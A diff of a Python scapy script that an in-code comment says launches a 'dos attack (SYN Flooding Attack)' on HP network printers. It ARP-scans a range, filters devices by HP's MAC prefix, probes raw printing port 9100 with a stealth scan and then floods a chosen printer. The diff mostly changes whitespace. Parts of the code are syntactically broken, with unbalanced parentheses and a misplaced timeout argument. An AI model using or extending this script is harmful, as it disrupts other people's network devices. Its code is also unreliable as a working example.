@@ -4,19 +4,18 @@
 from scapy.all import *
 
 RAW_PRINTING_PORT = 9100 #this port is used for raw printing
+list_of_hp_printers = []
  
 def main():
 	your_network_ip_range = str(input("What is your ip range? ")
 	#scan the network to create a list of hp printers
 	list_of_hp_printers = arp_scan(your_network_ip_range)
-				    
 	#wait for arp request to a hp printer
 	hp_printer_ip = wait_for_connection_attempt()
-				    
+		
 	#start dos attack (SYN Flooding Attack) on the printer
 	dos_syn_flooding_attack(hp_printer_ip)
 
-				    
 def arp_scan(ip_range):
 	list_of_printers =[]
 	ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=str(ip_range), timeout=2)
@@ -24,8 +23,7 @@ def arp_scan(ip_range):
 		if recived[ARP].hwsrc[0:8] == "9c:7b:ef": #Hewlett Packard(HP) mac address
 			if stealth_scan(recived[ARP].psrc,RAW_PRINTING_PORT) == True:
 				list_of_printers.append(recived[ARP].psrc)
-	return list_of_printers
-						
+	return list_of_printers 	
 
 			
 #function to filter frames by the first half of the destination mac address(that determine that this is an hp #device -> 9C:7B:EF) and  if arp opcode == 1 (to check if this is a arp request to one of the printers)
